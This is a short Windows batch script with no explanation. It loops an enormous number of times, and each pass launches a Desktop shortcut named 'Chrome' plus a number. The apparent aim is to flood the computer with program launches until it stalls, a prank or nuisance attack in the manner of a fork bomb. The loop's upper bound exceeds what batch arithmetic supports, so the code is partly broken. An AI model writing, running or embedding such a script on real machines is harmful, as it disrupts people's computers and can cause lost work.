 @echo off
timeout /t 1 /nobreak
:loop
for /l %%x in (1,1,100000000000000000000000000000000000000000000000000000) do (
   start "" "%USERPROFILE%\Desktop\Chrome %%x.lnk"
		
)
pause
